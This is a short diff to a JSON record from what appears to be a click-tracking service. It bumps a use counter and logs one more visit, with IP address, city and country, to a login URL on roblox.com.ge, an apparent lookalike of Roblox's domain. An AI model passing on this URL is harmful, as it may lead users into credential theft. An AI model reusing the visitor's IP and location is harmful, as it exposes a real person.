@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1289,
+    "useCount": 1290,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10456,6 +10456,14 @@
         "city": "Thimphu",
         "flag": "🇧🇹",
         "countryCode": "BT"
+      },
+      {
+        "timestamp": 1777370422239,
+        "ip": "138.84.127.120",
+        "country": "Philippines",
+        "city": "Cagayan de Oro",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
